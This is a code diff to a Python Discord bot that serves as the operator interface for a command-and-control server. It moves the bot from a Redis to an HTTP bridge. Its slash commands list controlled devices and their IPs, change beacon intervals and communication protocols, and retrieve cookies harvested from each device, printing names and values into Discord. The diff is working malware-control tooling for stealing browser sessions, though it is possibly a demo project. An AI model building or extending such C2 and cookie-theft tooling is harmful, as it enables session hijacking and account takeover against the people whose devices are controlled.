@@ -3,32 +3,24 @@ Discord bot entry point.
 Uses slash commands (app_commands) with autocomplete for a better UX,
 and logs every command invocation to the terminal for tracking.
 
-Commands are forwarded to the C2 server via Redis Pub/Sub so the server
-can process them and return results.
+Commands are forwarded to the C2 server via HTTP. If the server is
+offline, the bot falls back to standalone/demo mode.
 """
 
-import asyncio
-import json
 import logging
-import uuid
-from datetime import datetime, timezone
 from typing import Any
 
 import discord
 from discord import app_commands
 from discord.ext import commands
 
-import redis.asyncio as aioredis
+import httpx
 
 from config import (
     ADMIN_DISCORD_ID,
+    C2_SERVER_URL,
     COMMAND_PREFIX,
     DISCORD_BOT_TOKEN,
-    REDIS_CHANNEL_COMMANDS,
-    REDIS_CHANNEL_RESPONSES,
-    REDIS_DB,
-    REDIS_HOST,
-    REDIS_PORT,
     VALID_BEACON_INTERVALS,
     VALID_COMMUNICATION_PROTOCOLS,
 )
@@ -56,135 +48,83 @@ bot = commands.Bot(command_prefix=COMMAND_PREFIX, intents=intents)
 device_manager = DeviceManager()
 
 # ---------------------------------------------------------------------------
-# Redis bridge
+# HTTP bridge to C2 server
 # ---------------------------------------------------------------------------
 
-redis_client: aioredis.Redis | None = None
-pending_responses: dict[str, asyncio.Future[dict[str, Any]]] = {}
 
-
-async def connect_redis() -> aioredis.Redis | None:
-    """Attempt to connect to Redis. Returns None if unavailable."""
-    try:
-        client = aioredis.Redis(
-            host=REDIS_HOST,
-            port=REDIS_PORT,
-            db=REDIS_DB,
-            decode_responses=True,
-        )
-        await client.ping()
-        logger.info(
-            "Redis connected at %s:%d — server bridge active",
-            REDIS_HOST,
-            REDIS_PORT,
-        )
-        return client
-    except Exception as exc:
-        logger.warning(
-            "Redis unavailable (%s) — running in standalone mode", exc
-        )
-        return None
-
-
-async def publish_command(
-    command: str,
-    args: dict[str, Any] | None = None,
+async def call_server(
+    endpoint: str,
+    method: str = "GET",
+    json_body: dict[str, Any] | None = None,
 ) -> dict[str, Any] | None:
     """
-    Publish a command to the C2 server via Redis and wait for a response.
-    Returns the response dict, or None if Redis is unavailable or times out.
+    Call the C2 server via HTTP.
+    Returns the response dict, or None if the server is unreachable.
     """
-    if redis_client is None:
-        return None
-
-    request_id = str(uuid.uuid4())
-    message = {
-        "request_id": request_id,
-        "command": command,
-        "args": args or {},
-        "timestamp": datetime.now(timezone.utc).isoformat(),
-    }
-
-    future: asyncio.Future[dict[str, Any]] = asyncio.get_event_loop().create_future()
-    pending_responses[request_id] = future
-
+    url = f"{C2_SERVER_URL}{endpoint}"
     try:
-        payload = json.dumps(message, default=str)
-        await redis_client.publish(REDIS_CHANNEL_COMMANDS, payload)
-        logger.info("Published command to server: %s (id=%s)", command, request_id)
+        async with httpx.AsyncClient(timeout=10.0) as client:
+            if method == "POST":
+                resp = await client.post(url, json=json_body)
+            else:
+                resp = await client.get(url)
 
-        # Wait for response with a timeout.
-        response = await asyncio.wait_for(future, timeout=10.0)
-        return response
-    except asyncio.TimeoutError:
-        logger.warning("Timeout waiting for server response (id=%s)", request_id)
+            if resp.status_code >= 400:
+                logger.warning(
+                    "Server returned %d for %s %s",
+                    resp.status_code,
+                    method,
+                    endpoint,
+                )
+                return None
+
+            logger.info("Server response from %s %s: OK", method, endpoint)
+            return resp.json()
+    except httpx.ConnectError:
+        logger.warning(
+            "Server unreachable at %s — running in standalone mode",
+            C2_SERVER_URL,
+        )
         return None
     except Exception as exc:
-        logger.error("Error publishing command: %s", exc)
+        logger.error("Error calling server: %s", exc)
         return None
-    finally:
-        pending_responses.pop(request_id, None)
 
 
-async def response_listener() -> None:
-    """Background task: listens for responses from the C2 server."""
-    if redis_client is None:
-        return
+def format_server_devices(data: dict[str, Any]) -> str:
+    """Format a /admin/devices response into a Discord-friendly string."""
+    devices = data.get("data", {}).get("devices", [])
+    if not devices:
+        return f"✅ {data.get('message', 'No devices found')}"
 
-    pubsub = redis_client.pubsub()
-    await pubsub.subscribe(REDIS_CHANNEL_RESPONSES)
-    logger.info("Listening for server responses on %s", REDIS_CHANNEL_RESPONSES)
-
-    try:
-        while True:
-            message = await pubsub.get_message(
-                ignore_subscribe_messages=True,
-                timeout=1.0,
-            )
-            if message and message["type"] == "message":
-                try:
-                    data = json.loads(message["data"])
-                    request_id = data.get("request_id")
-                    if request_id and request_id in pending_responses:
-                        pending_responses[request_id].set_result(data)
-                        logger.debug("Response matched: %s", request_id)
-                except json.JSONDecodeError as exc:
-                    logger.error("Invalid JSON from server: %s", exc)
-    except asyncio.CancelledError:
-        await pubsub.unsubscribe()
-        await pubsub.close()
-        logger.info("Response listener stopped")
+    lines = [f"✅ **Server Response — {data.get('message', '')}**"]
+    for d in devices:
+        status_emoji = "🟢" if d["status"] == "online" else "🔴"
+        lines.append(
+            f"{status_emoji} **{d['name']}** — "
+            f"IP: `{d['ip']}` — Status: {d['status']}"
+        )
+    return "\n".join(lines)
 
 
-def format_server_response(command: str, data: dict[str, Any]) -> str:
-    """Format a server response dict into a Discord-friendly string."""
+def format_server_cookies(data: dict[str, Any]) -> str:
+    """Format a /admin/cookies response into a Discord-friendly string."""
+    cookies = data.get("data", {}).get("cookies_by_device", {})
+    if not cookies:
+        return f"✅ {data.get('message', 'No cookies found')}"
+
+    lines = [f"✅ **Server Response — {data.get('message', '')}**"]
+    for device_name, device_cookies in cookies.items():
+        for cname, cvalue in device_cookies.items():
+            lines.append(f"🍪 `{device_name}` → `{cname}` = `{cvalue}`")
+    return "\n".join(lines)
+
+
+def format_server_simple(data: dict[str, Any]) -> str:
+    """Format a simple success/error response."""
     status = data.get("status", "unknown")
     message = data.get("message", "")
     emoji = "✅" if status == "success" else "❌"
-
-    if command == "show-devices":
-        devices = data.get("data", {}).get("devices", [])
-        if not devices:
-            return f"{emoji} {message}"
-        lines = [f"{emoji} **Server Response — {message}**"]
-        for d in devices:
-            status_emoji = "🟢" if d["status"] == "online" else "🔴"
-            lines.append(
-                f"{status_emoji} **{d['name']}** — "
-                f"IP: `{d['ip']}` — Status: {d['status']}"
-            )
-        return "\n".join(lines)
-
-    if command == "request-cookies":
-        cookies = data.get("data", {}).get("cookies_by_device", {})
-        if not cookies:
-            return f"{emoji} {message}"
-        lines = [f"{emoji} **Server Response — {message}**"]
-        for device_name, device_cookies in cookies.items():
-            for cname, cvalue in device_cookies.items():
-                lines.append(f"🍪 `{device_name}` → `{cname}` = `{cvalue}`")
-        return "\n".join(lines)
-
     return f"{emoji} {message}"
 
 
@@ -239,9 +179,7 @@ def log_access_denied(interaction: discord.Interaction, command_name: str) -> No
 
 @bot.event
 async def on_ready() -> None:
-    """Sync slash commands, connect Redis, and log when the bot connects."""
-    global redis_client
-
+    """Sync slash commands and log when the bot connects."""
     try:
         synced = await bot.tree.sync()
         logger.info(
@@ -253,10 +191,12 @@ async def on_ready() -> None:
     except Exception as e:
         logger.error("Failed to sync commands: %s", e)
 
-    # Connect to Redis (non-blocking — bot works without it).
-    redis_client = await connect_redis()
-    if redis_client:
-        asyncio.create_task(response_listener())
+    # Check server connectivity.
+    health = await call_server("/health")
+    if health:
+        logger.info("C2 server is reachable — server bridge active")
+    else:
+        logger.warning("C2 server is not reachable — standalone mode")
 
     logger.info("Waiting for commands...")
 
@@ -310,9 +250,9 @@ async def show_devices(interaction: discord.Interaction) -> None:
     log_command(interaction, "show-devices")
 
     # Try server first, fall back to local.
-    server_response = await publish_command("show-devices")
+    server_response = await call_server("/admin/devices")
     if server_response:
-        response = format_server_response("show-devices", server_response)
+        response = format_server_devices(server_response)
     else:
         response = device_manager.show_devices()
 
@@ -340,11 +280,11 @@ async def set_beacon_interval(
 
     log_command(interaction, "set-beacon-interval", f"interval={interval}")
 
-    server_response = await publish_command(
-        "set-beacon-interval", {"interval": interval}
+    server_response = await call_server(
+        "/admin/beacon-interval", method="POST", json_body={"interval": interval}
     )
     if server_response:
-        response = format_server_response("set-beacon-interval", server_response)
+        response = format_server_simple(server_response)
     else:
         response = device_manager.set_beacon_interval(interval)
 
@@ -367,9 +307,9 @@ async def request_cookies(interaction: discord.Interaction) -> None:
 
     log_command(interaction, "request-cookies")
 
-    server_response = await publish_command("request-cookies")
+    server_response = await call_server("/admin/cookies")
     if server_response:
-        response = format_server_response("request-cookies", server_response)
+        response = format_server_cookies(server_response)
     else:
         response = device_manager.request_cookies()
 
@@ -397,13 +337,13 @@ async def set_communication_protocol(
 
     log_command(interaction, "set-communication-protocol", f"protocol={protocol}")
 
-    server_response = await publish_command(
-        "set-communication-protocol", {"protocol": protocol}
+    server_response = await call_server(
+        "/admin/communication-protocol",
+        method="POST",
+        json_body={"protocol": protocol},
     )
     if server_response:
-        response = format_server_response(
-            "set-communication-protocol", server_response
-        )
+        response = format_server_simple(server_response)
     else:
         response = device_manager.set_communication_protocol(protocol)
 
